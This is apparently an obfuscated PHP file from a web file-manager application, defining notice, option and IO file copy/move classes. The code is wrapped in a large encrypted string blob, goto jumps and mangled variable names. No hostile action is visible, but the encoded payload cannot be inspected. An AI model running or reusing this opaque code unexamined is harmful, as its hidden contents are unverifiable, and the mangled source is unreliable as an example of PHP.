4\x2b\x23\x9\x8\xc3\xa1\xbf\x22\x4f\xa4\xb3\x4d\x44\xe8\x14\x73\x24\xf6\x30\x2b\x29\x12\xeb\xed\xa9\xf6\xcd\xdc"."\260\301\157\60\213\104\146\367\304\362\372\70\66\215\367\372\234\370\250\45\320\365\34\21\0\156\114\52\334\36\17\223\160\177\377\114\161\117\224\133\36\52\330\34\261\251\151\161\17\227\262\372".base64_decode('WJpKNC/y2DGZ1aifz4gCbSoTy3kw2Cmkcj4vKKfxEV1gwOkbfIl4CU++Y0XDgULBwVJYBA==').base64_decode('H39ljX4/5wP0SMyXFBcxGQrhQi44NiR0JeArYwQ8jDipWeR8i8NRWRwIZI55i8RKePIiKw==')."\x59\x34\xa\xb6\x83\xaf\xd1\xc7\x9d\xab\xc8\x7b\x6a\x6b\xb4\x61\x8d\xa2\x54\x29\xa0\xe7\x6b\xaa\x22\xcf\x61\x54\x21\x3e\x46\x53\x18\x33\xe3\x15\x5c\x84\xbf\x86\x44\xe3\x6c\x53\x15\x69\x84\x95\xd1\x75\x94\x9f"."\xf0\xaa\x4a\x1f\x41\x19\xab\x14\xc6\x4d\x73\x1a\xef\xc7\xa2\x6d\xa2\xb5\x94\x5f\xf9\x83\x37\x2a\xbb\x63\x70\x71\x29\xd0\x9\x7\x91\x47\x9f\x48\x7f\xa7\x1f\xcd\x28\x89\x3c\xa0\x99\x45\x32\x33\xb9\x96\x41\xf8"."\26\21\314\323\130\177\113\221\340\255\314\256\130\64\21\15\262\247\350\234\212\136\12\233\303\66\31\26\275\322\52\166\151\354\162\35\267\73\142\30\134\272\360\3\4\250\241\130\312\347\271\41"."\x28\xa6\x57\xbe\x4\x36\x55\xfe\xd3\x43\xce\x4a\xf5\x54\xdf\x24\xe9\x4a\x8f\xc6\x4e\x52\x81\xbb\xd2\xa3\xe1\x78\xa6\x64\x8b\x55\x18\xbf\xb7\x91\xc0\xd7\xf3\x2d\x0\x4b\xde\x4a\xb1\xaf\x54\x3d\xe5\xeb\xa1\xee"."\4\232\352\330\325\52\146\166\52\256\171\62\114\71\105\301\113\103\37\357\165\64\377\375\300\76\305\314\252\306\207\177\360\106\124\265\247\272\306\67\263\266\272\74\205\32\370\72\323\261\235\234"."\172\174\34\45\302\213\114\260\304\223\53\214\301\110\70\324\231\120\303\260\272\327\67\34\353\253\23\367\12\15\113\170\36\246\341\240\354\44\1\367\252\317\321\254\12\135\103\117\137\22\334\74"."\x55\xcf\x3b\x74\xb6\xb4\x4b\xb3\x26\xf3\x4b\xdb\x50\x57\x57\xe7\xad\xab\x47\xff\xb3\xfb\x16\xcc\x1b\x66\x23\x73\x68\x23\xa1\xd4\xd5\x35\x92\xff\x69\x2\x79\x6e\xd\x48\xd0\x99\x82\x58\x22\xe3\xe5\xdc\x5f\x87"."\16\25\202\265\23\355\224\113\114\36\355\11\342\33\250\12\256\32\14\213\60\257\105\324\107\334\305\62\266\352\170\315\123\41\226\0\20\323\335\235\300\115\54\200\236\331\131\2\365\1\16\37"."\102\173\256\374\0\351\24\250\57\277\362\214\320\304\254\131\110\157\233\67\361\112\205\362\251\36\371\143\76\326\271\24\50\374\337\173\131\202\127\176\203\6\62\121\106\47\116\17\35\125\103\171".base64_decode('nH5oMQRJNkneTgyQ9LZYxpV86+KofEhIkvm9YRLLcuclONrJS6JPHdG7u9CHFWZhxhxRhQ==')."\x6c\x82\xa3\xc7\xf3\x18\xe9\x52\xbc\xdb\x64\x64\x98\x92\xee\x76\xe3\x7e\x65\x6b\x92\x84\xce\x4d\xd9\x84\x1d\x10\x98\x35\x11\x3f\x1d\x83\x86\xd3\x63\x88\x2a\x65\x95\xfb\x76\x21\x46\x64\x2d\x49\x38\x73\xe2\x82".base64_decode('EP8K8AefqCUzq5sCHIVGiTd8+oYw0d807l82uLZ7YMkYOY4/3PaDLCaNFDsZi3+JiR+DhA==')."\30\200\236\351\5\271\23\132\251\0\167\222\53\117\200\36\250\225\145\0\170\71\66\71\167\254\200\215\341\56\154\342\156\66\310\35\133\311\76\150\251\352\111\62\45\263\340\35\20\141\307\303"."\xca\x18\x96\x36\xa2\xbe\x42\xd1\x1c\x40\xa3\x6e\xc9\x9d\x86\xe0\x5d\x95\xc1\x1c\xbd\x1c\xb3\x2\x12\xaf\xbd\x8c\x27\x3\xf1\x9\x27\x7b\xa0\x1c\xc8\x59\xb8\x4a\xd0\x52\x7c\x71\x94\x50\xc5\x15\x7b\x9\xe8\x9c".base64_decode('zVJCkL/LJgPxxla23CK7CmcZeMfshPCafQHRMU2HDa/XywbNFE1wJKyFkh+fVB1kwmiVGQ==').base64_decode('iuEeEiYZTjiFUV2E49g4QRhdVk9AdSiUTipcQIS9rRx3uGwHMoWp29QkZ3OmvX7quSxwPg==')."\303\302\335\312\237\1\225\17\340\160\227\252\262\232\10\317\350\166\376\136\173\5\102\164\22\133\31\125\221\165\33\27\0\265\101\263\131\212\341\322\331\231\50\332\45\133\124\351\351\301\140\205"."\276\371\255\340\227\314\247\71\307\247\74\3\274\216\146\42\351\21\173\264\226\63\341\262\272\135\54\152\251\203\43\362\272\122\321\215\31\271\52\63\174\15\140\200\73\203\75\215\102\371\261\260".base64_decode('t/BDs3tQs/rQVmc9X01gQHooN2Zl4ipDKMXGR3GurtJaocgFoVU3kcEanj6FVHMheVijQg==').strrev('aä£F#uc^UƒUËÒ&UE‹¼Y ›|²#>ZJ@ø¸Ç·Í¦8Gç{½Æ¾Âv*')."\x69\xc7\xee\x8a\xba\x4d\x6c\x71\xe\x49\xa2\x41\x51\x69\xe5\x25\xeb\xbe\xcd\x96\x6e\xf6\x6e\x83\x30\x4d\x25\x41\xc1\x80\x5f\xbf\xe4\x54\x16\xd8\x2c\xe8\x28\x2e\x59\x34\x56\xa8\x1f\x94\xca\xcb\xc4\x35\xc8\xb"."\xcb\x58\x10\x60\x8a\x7a\xd2\x2c\xa6\xf0\x82\x28\xf9\xd8\xc9\xdb\x31\x7d\x40\x8e\x12\xab\x6\x36\x1b\x84\xef\x77\xb9\x8\xec\xb8\x4c\x62\x3b\x78\x16\x6\x92\x76\x49\x76\x83\x26\x3d\xf\x81\x62\xd2\x33\x20\x92"."\40\352\255\127\270\4\253\322\222\151\144\226\224\100\360\53\11\263\56\205\255\164\317\215\150\246\342\245\176\176\30\355\22\61\331\325\71\105\226\340\330\135\70\134\0\361\113\205\133\140\311\151"."\xa8\x58\xec\x96\x5d\xb4\x4c\xce\x42\xbe\x59\x96\x85\xa6\x61\x21\x4a\x5c\x9a\x93\x53\x2c\xfc\xbe\x47\x37\x1b\xc5\x4a\x29\x15\x3e\x45\x92\xa4\x1e\x4d\x32\x4a\x83\x59\xbe\x52\x74\x12\x24\x8c\xe9\xcc\xa6\xdb\x5b".strrev('ks¡,’ŠÇ‹âO¹Ä7Ÿ	A<O¤t¦8Àh‹oo'."\0".'È”q¼1£9¶:EòÃO]àß')."\151\342\46\112\146\353\302\242\211\32\121\143\204\356\112\351\264\207\160\162\213\303\354\335\205\200\346\207\63\35\136\372\20\225\241\236\252\114\207\31\242\253\20\170\116\106\176\313\204\344\22\355".strrev('…68^üc´8=‹S[Ç`¤Š©…İnX˜N93ùv-¨³,#H‰ï¤Èw').base64_decode('xIs0N3a35AhL5cRpOSLU9NORm4M41ojOnAewnXpXe5efg5r59KSKEuGfL8jsK/VRHTZ4Iw==').base64_decode('OSOpRKJt4WAg0hKOL1UG8MErl1TIc0DOqUy0xLTjGVX386dpcNDbj3YM3hTfVVli/0TaAg==').base64_decode('hYl3/JzFUvrTi2Ul5vFtvmxZHqz7roCdFZpeCblQ1Mvxx3Rs8SjVWMpQqlAbwK/8BfKekA==')."\x8c\x8d\x4\x21\x3d\x3f\x59\xe5\x8d\xfc\xb0\x61\x19\x62\xe2\xb3\x1c\x63\x72\xe9\x81\x96\x8e\x70\xa7\x1a\x88\x44\xa2\xcb\x1d\x86\xc2\x42\xeb\x5f\xe4\x2a\x93\x94\xfc\xb6\x93\x34\x32\x62\x10\xe8\xd7\xcb\xdd\x40".base64_decode('gtM9+d0MlxqFDp/sT7TATrPgzVn+1guNSm+vFYqaYekSgD4TNhMuz2nZrOMl1WxaipacKw==').base64_decode('a8VPqfQDDEZE2skRYuG29sT/uKpGSngKNFLM4oxfkabPwATlV3fZN8VjQ+WQ/+nbdR5xIg==')."\xa8\x12\x4f\x6b\xec\x91\x4c\x93\x6c\x90\x40\x7a\xa7\xb0\x70\x54\xa5\xe\xc7\xc4\x27\x90\xbc\x52\x1c\x2b\xc8\x47\xb2\xfe\x14\x94\x80\x7d\xa2\x86\xd8\xf1\x1f\x8e\x88\x1d\xa\xc6\x82\x42\xf0\x57\xe8\xbe\x15\x6d"."\xc7\xb1\xea\x90\xed\x65\x98\x1a\xe\x31\xc\xe8\x70\x87\xf5\xa5\xeb\xf1\x3d\xb7\xbd\xbc\xe3\x69\xbd\xb2\x6f\x90\x97\x5e\x68\x1a\x39\x83\x42\x98\x7d\xa2\x4d\x28\xc6\x5f\x76\x12\x59\xdd\x29\x15\x2a\x80\x92\x15"."\241\334\342\10\112\223\122\107\337\201\344\257\366\50\213\230\43\10\361\1\342\327\60\224\53\330\216\75\175\273\174\167\106\32\22\12\300\232\236\42\127\325\321\61\147\121\74\260\115\154\60\125"."\x79\x95\x24\x82\x92\xd8\xe9\x61\x3\x4c\x33\x37\x56\x6\x70\xe8\xc1\x22\xac\x35\xdc\x54\x1a\xbf\x74\x94\x4f\x9b\x72\xaf\x13\x7e\x8e\xaf\x4f\xd1\x57\x5e\xa9\xca\xc1\x83\x76\x1e\xba\x5d\xfe\x5e\x1c\xcd\xfe\x7f"."\x93\x91\x26\xc6\x25\x7\xb7\xce\x42\xca\x2b\x64\xb9\x57\x4a\x21\xb5\xe1\xa7\xf0\x32\xe6\x88\xf3\xe9\x57\xc\x71\x3f\x7e\xe7\x78\xf6\x4e\x9a\x61\xc4\xad\x81\xfc\x50\x9f\x33\x93\xa7\xec\xc5\x29\x85\xbc\xda\xad"."\40\146\4\143\217\215\166\330\226\226\40\113\237\236\101\177\172\341\227\255\206\356\112\120\76\7\237\254\345\244\30\314\30\331\124\221\33\147\11\100\207\56\364\14\44\27\142\54\5\215\275\116"."\x4e\x9e\xc5\x84\xe6\xf2\x47\xae\x2a\xbd\x88\x88\xbd\x99\x3a\xdf\xea\x12\x4f\xa0\x89\xa5\xd7\xf9\x24\x14\x3f\xf0\xb7\xc4\x14\xb2\x6c\xc7\x23\x64\x9\x33\xa1\xd\x78\x28\xa9\x62\xa6\x28\x62\xcd\x63\x72\x58\x36"."\337\47\255\100\211\114\27\230\342\343\275\130\102\140\357\212\246\74\344\321\113\312\27\335\257\150\111\363\223\263\137\71\367\100\326\354\327\262\140\71\350\270\154\127\104\233\61\235\55\41\16\64"."\xa\xf2\x6b\x85\x82\x38\xf9\x90\x57\x5c\xf4\xaf\xe3\x1e\x35\xa4\x75\x27\xda\x55\xe2\x53\x44\xa5\xe6\x9\x71\x41\x73\xd2\x69\x24\x5\xc2\xc9\x64\x29\x1f\xa6\x27\x30\xe\x68\x51\xda\x26\xca\xae\xa1\xe9\xa9\x8c".strrev('pÒ¤YA'."\0".'ãï\'ÌnÉ4§³Y°QÀffÇJ?/í7|Gâ:s’.L:ô]¨è¸')."\x4c\x64\x4c\x4a\x48\x98\xa6\xcf\x8a\x12\x4e\x21\x73\xb4\x2f\x80\x4a\x2f\xbc\xc1\xf3\xa5\x95\x1e\x6c\xa3\x94\x4f\x7e\x5a\xf4\x34\xdf\x13\xe1\xb8\x90\xd\x64\xbf\x48\xc2\xf8\xc6\xfd\xb2\x68\xf9\x2b\xa9\xec\x45"."\124\66\165\340\71\324\12\157\234\116\372\104\252\107\334\274\376\242\167\340\304\75\137\347\243\367\270\35\134\262\340\333\216\262\235\213\173\323\302\273\325\225\41\346\356\344\204\131\256\136\26\306".strrev('õõÉÊ[=?î-/Ú%áZÜéW²;â±âÌ<.ìCÖb¥İ©êV+kV¥\\')."\x17\xd9\x1\xb5\x1b\xcd\x70\xd0\x2e\x5a\x80\xc5\xe5\x3f\xea\x8\xba\x6c\x81\x58\x99\x4b\x35\xcc\x9e\xbb\x40\xd6\x8d\x88\x21\x14\xc7\xb6\xe0\x47\x5\x4e\x9f\x41\xc6\x11\x44\xa1\x38\xba\xc1\xa3\x30\xef\xd3\xf2".base64_decode('7CeJzos25Y8Wu1aA/9mEEZsPiipZ5ZY/717WA4ROJdswaUF0WfiY2OjGErOOLoHiqWLntw==').base64_decode('qPhQoR3is9Jkoc/Omlm8Rc9h1b9d1Jz70UrbLtITbI+Htbci5rSBAmWMSJb2ZXKJtunWJA==')."\xe1\xec\x78\x5d\x24\x5a\xd1\x68\x3e\xb\xcb\x36\x76\x4b\x21\x66\x9b\xc4\x89\xfe\x7\x3\xc8\xb6\x58\x74\x37\x26\x8c\xbf\x70\xf3\x1d\x3b\x73\x67\x2f\xf8\x8f\x63\x6c\xa6\xc2\x13\xc3\x92\x69\xcc\x17\xb4\x81\x4a".strrev(' Q\'Ê—fçA%®"^“Ü\\©™GŸFQ6Qâ®İ³°ˆ]°d£·R&’œD¯lÕék|z').base64_decode('kDvNTpFJfiiVXAgWPnvI1HVMY8nZu3yhlhQkz4/yoqVnZ4WCiWikoEUwuYmtBKlmoI1fxw==')."\326\44\113\76\247\326\13\204\73\351\315\164\324\175\322\263\342\246\34\226\236\63\106\153\102\224\135\235\100\325\161\154\143\121\274\305\365\344\74\341\137\356\167\350\131\237\21\246\41\370\241\164"."\315\337\261\125\342\57\161\72\266\116\226\373\71\136\44\12\72\236\43\111\225\275\140\16\214\223\134\252\243\137\223\226\136\126\251\1\51\324\131\312\211\210\244\73\46\373\55\236\350\360\206\200".base64_decode('Hf65eATzsWC5Xumm3stpmG0L/tcv0f6/eoB2bh3T8jserm8D4Rxqi49Sua6Daphd7XAurw==')."\x53\x81\x8a\x50\xe7\xfb\x86\x5\x53\x21\x71\x6e\x32\xce\x9c\x3e\x32\x5f\x90\x1a\x3b\x69\xd3\xb2\x59\x69\x11\xae\xbc\x9d\x29\x7b\x1e\x1c\x11\xdf\x20\x7f\x52\xba\x52\xc4\x7d\x75\xd8\xfd\x54\x78\xf\x51\xf0\xb2".base64_decode('V8D7KiEKvsR3TRXomIKYsCx4Ut5IDlY4Jif2sM7XBiThpAxN1AHJMMybpp+Fkni7SDzHQA==')."\357\311\267\373\243\5\266\261\254\205\125\240\17\176\301\243\10\60\55\231\121\71\100\145\354\55\341\30\23\7\120\356\156\301\203\174\154\70\35\71\72\134\57\37\123\44\346\54\30\254\40\44"."\x7e\x5a\x6e\x35\x51\x9e\x9b\xf3\x1\x39\xb\xb6\xd4\x77\xaa\xc6\xf0\x0\xe3\x8a\x79\xeb\xbc\x2e\x40\xbd\xd7\x55\x1c\x7f\xfc\xd9\x49\xeb\x8e\xd7\x88\xa9\xa5\x9\x9a\x20\x31\xac\x2\x61\xaa\x30\x72\xb8\x44\x4e".base64_decode('mb3leShdxwXOJDOr8vzmlRLqQByS+4Pxia6iSQRFJ5SrhSTL6KSkc3XLfhQ8wyc3RD5+dQ==')."\236\341\140\323\74\161\250\231\210\306\102\352\362\60\366\104\21\136\25\352\146\76\224\15\223\274\146\302\212\354\356\250\41\227\326\140\2\240\135\114\253\51\110\111\107\314\114\122\0\13\107\300"."\x76\xae\x10\xe4\x47\xb0\xce\xab\xcf\xd2\x95\x8\xe6\x86\x4b\x56\x49\x3a\x91\xf1\xbd\x16\xe7\x5c\x5c\x5c\x9\x2d\x69\x16\x2d\xd9\x8b\xa6\x23\x11\x8b\x5d\x26\x4a\x8d\xb1\x7d\x74\x77\x1e\x4d\x64\x3d\x69\xeb\x29"."\x5\x2f\xe0\xe\x99\xbe\x67\x4e\xdd\xec\xbe\x2f\x2a\x5\xa5\x73\xcc\x39\x5f\x82\x9\x9b\x8b\xf8\x6c\x2f\xb3\xe2\x65\x38\x15\xf3\x99\xd4\x6d\x4e\xa5\x34\x44\x9b\x71\xdb\x41\x44\xe2\x29\x1c\xf7\x13\x38\xad\xe"."\227\124\215\222\212\124\41\316\271\340\55\244\111\306\246\323\14\12\321\302\225\206\131\303\344\251\170\167\312\317\231\331\313\51\330\102\316\217\175\167\341\153\30\176\102\177\240\331\136\251\346\124"."\x66\x30\x84\x75\x2\x42\xb3\x43\x38\x6e\xf9\x9e\x10\xbe\x64\x17\xc7\xa2\xc5\x58\x8e\xdf\xbe\x20\xda\x1c\xaa\xa0\x71\xe8\x69\xc0\x2e\x40\x6\x49\xe7\xe4\x68\xb3\x95\x72\x3e\x1e\x46\x12\x9\x98\x39\xeb\x86\x12"."\244\223\136\347\101\73\277\316\132\266\376\225\214\210\224\114\162\61\247\257\350\27\337\314\17\13\317\111\44\231\236\141\5\206\65\356\234\314\235\253\333\261\221\225\216\345\223\204\103\204\312\117"."\x5e\xc5\x81\xb0\x24\x3d\xb2\x6c\x78\x27\x2c\x16\x76\x17\x5c\xe2\xa8\x62\xcd\xd3\x86\x85\x2c\x2c\xf6\x62\xa9\x54\xab\x36\x5c\x1\x35\xa5\xbb\x9d\xcb\x21\x8\x47\x25\xb2\xb4\xe4\x72\x43\x5c\x89\xd1\x47\xe4\xaf"."\3\236\270\261\342\100\54\207\12\227\34\122\176\161\6\47\232\211\141\225\232\117\70\234\63\273\354\362\203\23\225\0\321\307\241\270\15\213\264\357\305\106\76\302\270\205\66\205\253\167\304\47".strrev('y,]*‚#ù^!šOÄŸ\'"6zD”E|T’İJè˜ÒkN×PyÔ®C„38F').base64_decode('ZhEJTGSRS3GsWbxhgBmTEx3VcQ8t2XgK8qXAHFHj07SAM4ni667ayxncLaM5HO8GyvARww==')."\116\146\244\135\162\171\142\71\274\130\326\331\120\201\312\355\160\327\226\365\265\133\167\40\12\51\253\217\144\346\223\60\53\344\241\65\252\230\215\46\341\234\142\163\342\310\73\111\27\340\274\64".strrev('Õ*-Ì¹9Ğ…®U^Q67D 9ş\\ˆ¬ş²u	'."\r".''."\n".'©Qt;ÊóI5’µ³ä•úË™fK-ç	').base64_decode('oiLypLVwYwuZA+9AK6U4rJOcK0olvs1SKnBqyoUmNVsSpjzlS4ZIq2BYRD+JpR/Zi2OFZA==')."\331\112\251\262\35\123\254\42\227\261\234\6\106\56\270\334\101\340\147\234\106\230\41\42\22\301\262\306\240\60\340\144\367\67\100\353\300\255\41\7\363\46\137\236\122\302\76\27\113\116\201\242"."\273\237\313\112\163\222\176\276\44\171\174\257\170\235\304\203\25\103\345\52\230\254\306\357\365\11\33\67\272\147\66\155\43\251\73\335\312\313\316\34\151\72\373\110\126\122\103\273\64\300\102\115".strrev('üfÓƒÛE›M8K§6ø“àü6Äüz,3$T^ÛD‹hZÃ‰ô % ©€0å')."\x36\x9b\xb6\x2d\xac\x49\xa8\x5e\x88\x88\xd9\x78\x1d\xf6\x48\xc6\x52\x28\x24\x4e\x39\x71\xa5\xc8\xf1\x19\x21\x5b\xc2\xb1\x48\x10\xe\xe2\xb1\xc2\x25\xae\xd3\x54\xc2\xe7\x1c\x11\x7c\x2c\xc7\x23\xf2\x32\xb\x7".base64_decode('8q0ll8mAAAyaqX5zlHlQRHQldZI4uNPcsqUQi4AUZdMv4mnE8tMUP7xh5CVlwHuovjWFAQ==').base64_decode('R3b6wiQ30f6iEkB5L4qgD5gQTSrcRosn4mVJXYF4fHk01kLfOylLJrkkU7qypK72aOdkaQ==')."\241\216\100\70\122\226\206\255\356\72\125\341\213\223\46\205\273\110\55\311\331\363\144\265\10\7\227\212\232\224\273\100\145\147\145\21\170\62\123\214\213\164\166\124\310\230\354\110\210\341\307\265"."\54\123\6\111\147\13\172\116\70\153\25\171\234\72\56\171\374\55\346\125\231\7\234\217\14\272\214\140\31\141\103\101\330\262\256\23\312\216\25\0\212\337\211\341\374\201\313\371\302\274\303\347".base64_decode('MAOR4GQOEaYk0aa83hPAzIodJJ81lJ+DkVTRAbhix5tglrnG7JfOueguC26TQ5dK1pM07A==').base64_decode('SLa1gYrWEFSFjLmEUO7+H44RGKPJuAAA').""."".strrev(''), 10, -8))); goto a“äŒŸÁÙæ; BèÙÎ”ä¹˜: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x6e\x6f\164\x69\x63\145\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\x63\x6f\x6e\164\x65\x6e\x74", "\x61\x75\164\150", "\155\x6f\x64\x65", "\164\151\155\x65", "\x74\x79\x70\145", "\154\x65\166\x65\154", "\145\156\141\x62\154\145", "\x73\157\x72\x74"); public function listData($êşèªä‹ = false, $‹ÓÓ™çÈ = "\163\157\x72\164", $®¸ÇÆóÂ = false) { return parent::listData($êşèªä‹, $‹ÓÓ™çÈ, $®¸ÇÆóÂ); } public function add($Óú’­ßŠ) { $Ä“®»™Ù =& $_SERVER[¢ñàß¿€]; $ú±ƒ‘šã = time(); if ($Óú’­ßŠ[$Ä“®»™Ù[16]] == $Ä“®»™Ù[2430]) { $ú±ƒ‘šã = strtotime($Óú’­ßŠ[$Ä“®»™Ù[206]]); } $Óú’­ßŠ[$Ä“®»™Ù[206]] = $ú±ƒ‘šã; return parent::insert($Óú’­ßŠ); } public function update($¸¿’êï, $Î÷ˆ´íÈ) { $ğß‡¿ĞĞ =& $_SERVER[¢ñàß¿€]; $€˜÷‹¸ã = $this->listData($¸¿’êï); if (!$€˜÷‹¸ã) { return !1; } $ªâØÅİ = time(); if ($Î÷ˆ´íÈ[$ğß‡¿ĞĞ[16]] == $ğß‡¿ĞĞ[2430]) { $ªâØÅİ = strtotime($Î÷ˆ´íÈ[$ğß‡¿ĞĞ[206]]); } $Î÷ˆ´íÈ[$ğß‡¿ĞĞ[206]] = $ªâØÅİ; return parent::update($¸¿’êï, $Î÷ˆ´íÈ); } public function remove($†½Ü£¸ã) { $Ù‹ŒÏÆİ = $this->listData($†½Ü£¸ã); if (!$Ù‹ŒÏÆİ || $Ù‹ŒÏÆİ[$_SERVER[¢ñàß¿€][191]]) { return !1; } return parent::remove($†½Ü£¸ã); } public function sort($ÏŠÙéÉÊ, $¸”²»Ñµ) { return parent::update($ÏŠÙéÉÊ, $¸”²»Ñµ); } public function enable($ºúê•±À, $ÈÖšåÁ) { return parent::update($ºúê•±À, array($_SERVER[¢ñàß¿€][2431] => $ÈÖšåÁ)); } private function initUserOption() { $Ëó§ÊøÓ =& $_SERVER[¢ñàß¿€]; $this->optionType = $Ëó§ÊøÓ[2432]; $this->modelType = $Ëó§ÊøÓ[2433]; $this->field = array($Ëó§ÊøÓ[2434], $Ëó§ÊøÓ[32], $Ëó§ÊøÓ[206], $Ëó§ÊøÓ[33], $Ëó§ÊøÓ[2435], $Ëó§ÊøÓ[821], $Ëó§ÊøÓ[226]); } public function userNoticeGet($®Ş¡¾…¶ = false) { $this->initUserOption(); return parent::listData($®Ş¡¾…¶, $_SERVER[¢ñàß¿€][475], !0); } public function userNoticeAdd($œß¾¥¼¾) { $ÙõĞç“ =& $_SERVER[¢ñàß¿€]; $this->initUserOption(); $ªØâÇßÎ = $this->findByKey($ÙõĞç“[2434], $œß¾¥¼¾[$ÙõĞç“[475]]); if ($ªØâÇßÎ) { return !0; } $šÕÇå…˜ = array($ÙõĞç“[2434] => $œß¾¥¼¾[$ÙõĞç“[475]], $ÙõĞç“[32] => $œß¾¥¼¾[$ÙõĞç“[32]], $ÙõĞç“[206] => $œß¾¥¼¾[$ÙõĞç“[206]], $ÙõĞç“[33] => isset($œß¾¥¼¾[$ÙõĞç“[33]]) ? $œß¾¥¼¾[$ÙõĞç“[33]] : 1, $ÙõĞç“[2435] => isset($œß¾¥¼¾[$ÙõĞç“[2435]]) ? $œß¾¥¼¾[$ÙõĞç“[2435]] : 0, $ÙõĞç“[821] => 0, $ÙõĞç“[226] => 0); return parent::insert($šÕÇå…˜); } public function userNoticeEdit($òØî¢ŞÂ, $´ß¿¶µµ) { $this->initUserOption(); return parent::update($òØî¢ŞÂ, $´ß¿¶µµ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\154\x65", "\x72\x6f\x6c\x65\107\x72\x6f\x75\160", "\x72\145\147\151\163\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($–©Üòî) { return "\123\x79\x73\164\x65\155\x4f\x70\x74\x69\x6f\x6e\137{$–©Üòî}"; } protected function optionDefault($†˜ª™ç¿ = '') { $²Ì¿ë­­ =& $_SERVER[¢ñàß¿€]; if ($†˜ª™ç¿ == $²Ì¿ë­­[12]) { return $GLOBALS[$²Ì¿ë­­[6]][$²Ì¿ë­­[457]]; } } } class SystemRecordModel extends ModelBaseLight { } goto BèáÍˆÖò; C–óĞ“åÄù: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Šûş¶¡ç, $úûÆ’éÂ) { $³¤Ù¸€ =& $_SERVER[¢ñàß¿€]; $Á‰©÷…¬ = $úûÆ’éÂ; $GLOBALS[$³¤Ù¸€[1224]] = $³¤Ù¸€[1225] . $Šûş¶¡ç; Hook::trigger($³¤Ù¸€[1225] . $Šûş¶¡ç . $³¤Ù¸€[1226], $Á‰©÷…¬); $±¿ß¸· = self::driverMake($úûÆ’éÂ[0]); if (!$±¿ß¸·) { return !1; } if (method_exists($±¿ß¸·, $Šûş¶¡ç)) { $Œ¥ËğÜ× = @call_user_func_array(array($±¿ß¸·, $Šûş¶¡ç), $úûÆ’éÂ); } else { if (method_exists($±¿ß¸·, $³¤Ù¸€[1227])) { $Œ¥ËğÜ× = @call_user_func_array(array($±¿ß¸·, $Šûş¶¡ç), $úûÆ’éÂ); } else { if (method_exists(self, $Šûş¶¡ç)) { $Œ¥ËğÜ× = @call_user_func_array(array(self, $Šûş¶¡ç), $úûÆ’éÂ); } else { $Œ¥ËğÜ× = call_user_func_array(array(parent, $Šûş¶¡ç), $úûÆ’éÂ); } } } Hook::trigger($³¤Ù¸€[1225] . $Šûş¶¡ç . $³¤Ù¸€[1228], $Á‰©÷…¬, $Œ¥ËğÜ×); return $Œ¥ËğÜ×; } public static function init($“¹·Ã®) { return self::driverMake($“¹·Ã®); } public static function copy($°ßêÏÀ, $¨è´ñ‰, $˜›Å°· = false, $î¹²ÇÑ÷ = false) { return self::copyMoveStart($°ßêÏÀ, $¨è´ñ‰, $˜›Å°·, $_SERVER[¢ñàß¿€][618], $î¹²ÇÑ÷); } public static function move($Ú‹ò›”­, $ïé¬É¾², $ÕÀ‡¼­… = false, $í®¦„™ = false) { return self::copyMoveStart($Ú‹ò›”­, $ïé¬É¾², $ÕÀ‡¼­…, $_SERVER[¢ñàß¿€][620], $í®¦„™); } private static function copyMoveStart($ì§à¢”, $±³‘Ô¶Î, $…ˆ¸¹Ì±, $ô¾ˆì , $Õ“æÕ ô) { $Œ„õıä„ =& $_SERVER[¢ñàß¿€]; $æ£¤Ÿ»Õ = array($ì§à¢”, $±³‘Ô¶Î, $…ˆ¸¹Ì±, $Õ“æÕ ô); Hook::trigger($Œ„õıä„[1225] . $ô¾ˆì  . $Œ„õıä„[1226], $æ£¤Ÿ»Õ); $Ó¥·©™² = self::copyMove($ì§à¢”, $±³‘Ô¶Î, $…ˆ¸¹Ì±, $ô¾ˆì , $Õ“æÕ ô); Hook::trigger($Œ„õıä„[1225] . $ô¾ˆì  . $Œ„õıä„[1228], $æ£¤Ÿ»Õ, $Ó¥·©™²); return $Ó¥·©™²; } public static function saveFile($ñôŞ°‰ñ, $«îç, $ÉÈæ¨ù¿ = true) { $¬¥Ò¡ê€ =& $_SERVER[¢ñàß¿€]; $üÁéÊ˜ = self::info($«îç); $Ùªç«„â = self::driverMake($ñôŞ°‰ñ); $ÏÁ–ïÇ = self::driverMake($«îç); $ÃùÍ± = !1; if ($ÏÁ–ïÇ->pathParse[$¬¥Ò¡ê€[1229]]) { $ÃùÍ± = $ÏÁ–ïÇ; $¥àœÚ˜ = $ÏÁ–ïÇ->pathParse[$¬¥Ò¡ê€[1229]]; $ÏÁ–ïÇ = self::driverMake($¥àœÚ˜); } if ($Ùªç«„â->pathParse[$¬¥Ò¡ê€[1229]]) { $üÈ–ú“ = $Ùªç«„â->pathParse[$¬¥Ò¡ê€[1229]]; $Ùªç«„â = self::driverMake($üÈ–ú“); } $­­ŞÒ†Å = $ÏÁ–ïÇ->pathFather($«îç); $‡ê¥èõÈ = !0; if (!$ÉÈæ¨ù¿ && self::driverIsSame($Ùªç«„â, $ÏÁ–ïÇ)) { $‡ê¥èõÈ = !1; } $Ûº×ğè = self::copyFile($Ùªç«„â, $ñôŞ°‰ñ, $ÏÁ–ïÇ, $­­ŞÒ†Å, $üÁéÊ˜[$¬¥Ò¡ê€[32]], $‡ê¥èõÈ); if ($ÃùÍ±) { $Ûº×ğè = $ÃùÍ±->getPathOuter($Ûº×ğè); } return $Ûº×ğè; } private static function copyMove($±¤ë§Ş—, $¼×Áß¦¯, $¾­®ÄÍ, $²»£ö×, $°îÕ±£ò = false) { $®¿Á¦›× =& $_SERVER[¢ñàß¿€]; if (!$±¤ë§Ş— || $±¤ë§Ş— == $®¿Á¦›×[8] || !$¼×Áß¦¯) { return !1; } ignore_timeout(); $å«Ë¯öÊ = self::driverMake($±¤ë§Ş—); $ˆ§‘ÁÜç = self::driverMake($¼×Áß¦¯); $ş°ôÎë§ = $²»£ö× == $®¿Á¦›×[620]; $ß’…ìé„ = !1; if ($ˆ§‘ÁÜç->pathParse[$®¿Á¦›×[1229]]) { $ß’…ìé„ = $ˆ§‘ÁÜç; $¼×Áß¦¯ = 